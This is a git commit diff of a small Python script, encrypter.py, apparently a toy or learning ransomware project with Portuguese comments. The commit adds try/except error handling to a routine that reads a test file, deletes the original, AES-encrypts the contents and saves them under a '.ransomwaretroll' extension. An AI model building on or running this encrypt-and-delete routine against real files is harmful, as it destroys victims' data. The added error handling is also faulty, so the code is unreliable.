a73a8af1da2e8986df04f9dcc9ddfb1108646c90
V1nic1us <marcusvinicius.mds16@gmail.com>
2025-03-05 18:40:54 -0400

    Add error handling for file operations in encrypter.py

--- encrypter.py
+++ encrypter.py
@@ -3,9 +3,14 @@ import pyaes
 
 ## abrir o arquivo a ser criptografado
 file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+try:
+    file = open(file_name, "rb")
+    file_data = file.read()
+except:
+    print("Arquivo não encontrado")
+    exit(1)
+finally:
+    file.close()
 
 ## remover o arquivo
 os.remove(file_name)
@@ -19,6 +24,11 @@ crypto_data = aes.encrypt(file_data)
 
 ## salvar o arquivo criptografado
 new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+try:
+    new_file = open(new_file, "wb")
+    new_file.write(crypto_data)
+except:
+    print("Erro ao criar o arquivo criptografado")
+    exit(1)
+finally:
+    new_file.close()
